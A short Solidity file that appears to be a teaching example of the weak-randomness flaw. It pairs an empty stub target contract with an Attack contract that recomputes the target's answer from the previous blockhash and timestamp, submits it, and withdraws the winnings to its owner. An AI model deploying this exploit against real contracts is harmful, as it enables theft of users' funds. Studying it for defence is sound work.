// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {}
}

contract Attack {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        guessTheRandomNumber.guess(answer);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function transferFunds() public {
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
